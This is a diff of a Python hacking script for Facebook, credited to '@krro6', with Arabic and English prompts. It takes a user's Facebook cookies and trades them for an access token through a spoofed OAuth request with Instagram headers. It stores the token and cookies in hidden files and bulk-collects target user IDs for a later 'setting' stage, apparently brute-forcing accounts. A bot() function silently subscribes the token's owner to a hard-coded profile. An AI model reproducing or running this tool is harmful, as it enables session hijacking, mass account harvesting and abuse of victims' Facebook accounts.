@@ -1022,39 +1022,36 @@ def banner():
  ''')
 	print(('—'*25)+'\n• XO By @krro6 •\n'+('—'*25))
 
-def نمرود():
+def login():
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 		tokenku.append(token)
 		try:
-			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-			sy2 = json.loads(sy.text)['name']
-			sy3 = json.loads(sy.text)['id']
-			SDM(sy2,sy3)
+			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
+			basganteng = json.loads(basariheker.text)['id']
+			menu(basganteng)
 		except KeyError:
 			login_lagi334()
 		except requests.exceptions.ConnectionError:
-			li = 'الانترنيت ضعيف عدك تحقق من الانترنيت يمك'
-			lo = mark(li, style='blue')
+			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
+			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
 	except IOError:
 		login_lagi334()
-
-
 def login_lagi334():
 	try:
 		
 		asu = random.choice([m,k,h,b,u])
 		os.system('clear')
-		cookie=input(f'كوكيز :{asu} ')
+		cookie=input(f'  COOKIES :{asu} ')
 		open(".cok.txt", "w").write(cookie)
 		with requests.Session() as rsn:
 			try:
 				rsn.headers.update({
                     'Accept-Language': 'id,en;q=0.9',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                     'Referer': 'https://www.instagram.com/',
                     'Host': 'www.facebook.com',
                     'Sec-Fetch-Mode': 'cors',
@@ -1065,24 +1062,24 @@ def login_lagi334():
                     'Origin': 'https://www.instagram.com',
                     'Accept-Encoding': 'gzip, deflate',
                 })
-				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&blueirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
+				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
 				if '"access_token":' in str(response.headers):
 					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
 					open(".token.txt", "w").write(token)
-					print('%sتم تسجيل الكوكيز%s'%(h, p))
+					print('%sLogin Succes%s'%(h, p))
 
 				else:
-					print('%sالكوكيز مو شغال%s'%(m, p))
+					print('%sFailled Get Token%s'%(m, p))
 
 			except:
-				print('كوكيز مو شغال')
+				print('Failled Get Token')
 
-		print(f'  {x}[{h}•{x}]{h}@krro6{x} ');time.sleep(1)
+		print(f'  {x}[{h}•{x}]{h} FAILD LOGIM{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s @krro6   %s'%(x,k,x,m,x))
+		print(f'  %s[%sx%s]%s LOGIN DONE%s'%(x,k,x,m,x))
 		print(e)
 		exit()
 def bot():
@@ -1090,7 +1087,7 @@ def bot():
 		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
-def SDM(my_name,my_id):
+def menu(id):
 	
 	os.system('clear')
 	banner()
@@ -1117,7 +1114,7 @@ def SDM(my_name,my_id):
 		
 	_____alvino__adijaya_____ = input('\n𝐂𝐇𝐎𝐎𝐒𝐄 : اختاࢪ   : ')
 	if _____alvino__adijaya_____ in ['1']:
-		dump_massal()
+		dump()
 		for stop in track(range(10)):
 			sleep(0.50)
 			stop
@@ -1143,20 +1140,20 @@ def SDM_file():
                 setting()
             except IOError:
                exit(f"\n{M}مسار خطاء %s لم يتم العثور"%(fileX))
-def dump_massal():
-	try:
+def dump():
+#	os.system('clear')
+#	print(TY)
+#	print('لا يعمل الان')
+	print('''
+	اهلا بك في الصيد عن طريق الايديات''')
+	with requests.Session() as ses:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
-	except IOError:
-	    exit()
+
 	try:
-		print(('—'*25)+'\n• XO By @krro6 •\n'+('—'*25))
-		output = render(' S D M',colors=['yellow','blue'], align='center')
-		print(output)
-		print(('—'*25)+'\n• XO By @krro6 •\n'+('—'*25))
-		webbrowser.open(f'https://t.me/LUCFER_XO_AND')
-		kumpulkan = int(input(f'ڪم ايدي تريد تصيد بيهم | 𝐇𝐎𝐖 𝐌𝐀𝐍𝐘 𝐇𝐀𝐍𝐃𝐒?  : '))
-		os.system('cls' if os.name == 'nt' else 'clear')
+		
+		kumpulkan = int(input(f'\n عدد الايديات  :  '))
+		
 	except ValueError:
 	    exit()
 	if kumpulkan<1 or kumpulkan>1000:
@@ -1165,15 +1162,13 @@ def dump_massal():
 	bilangan = 0
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
-		output = render(' S D M',colors=['blue','black'], align='center')
-		print(output)
-		Masukan = input(f'الايدي   '+str(bilangan)+f' : ')
-		os.system('cls' if os.name == 'nt' else 'clear')
+		Masukan = input(f' ادخل الايدي '+str(bilangan)+f' : ')
+		print(f'')
 		uid.append(Masukan)
 	for user in uid:
 	    try:
 	       head = (
-	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.2; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36"
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36"
 	       })
 	       if len(id) == 0:
 	           params = (
@@ -1200,22 +1195,14 @@ def dump_massal():
 	      pass
 	    except requests.exceptions.ConnectionError:
 	        exit()
-
 	try:
-		print('')
 
-		print(f'>> ID : عدد الايديات{h}'+str(len(id)))
-		time.sleep(2)
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f'{x}')
-		print('>> Sinyal Loh Kurang Bagus ')
-		back()
-	except (KeyError,IOError):
-		print(f'>>{k} Pertemanan Tidak Public {x}')
-		time.sleep(3)
-		back()
-
+	      yu = f'{b} Total ID :  \033[2;32m '+str(len(id))
+	      print(yu)
+	      setting() 
+	except Exception as e:
+	    print(e) 
+	    exit()
 def setting():
 	os.system('clear')
 	wl = f''
@@ -1572,4 +1559,4 @@ if __name__=='__main__':
 	try:os.system('clear')
 	except:pass
 	
-	نمرود()
+	login()
